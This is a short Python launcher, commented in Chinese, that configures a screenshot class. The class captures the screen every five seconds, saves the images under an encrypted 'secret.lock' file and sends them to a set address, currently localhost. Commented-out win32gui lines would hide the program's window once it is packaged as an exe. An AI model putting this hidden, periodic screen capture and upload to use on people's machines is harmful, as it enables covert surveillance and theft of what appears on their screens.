import os, re, cv2, time, requests
import numpy as np
from AseScreenshot import Screenshot
from datetime import time, datetime

if __name__ == '__main__':
    '''
    執行後會強制隱藏視窗(轉成exe檔才需開啟使用)
    # the_program_to_hide = win32gui.GetForegroundWindow()
    # win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)
    '''
    ip = 'http://127.0.0.1:5031'
    dir = 'C:/test_pic' # 圖片暫存位置
    filename = 'secret.lock' # 密文存放檔名
    shotter = Screenshot(secret_dir = dir, 
                            secret_filename = filename, 
                            similarity_threshold = 0.7, # 圖片相似程度的門檻值
                            ip_address= ip, # 設定目標網址
                            debug = True)
    shotter.cycle_shot(time_interval = 5)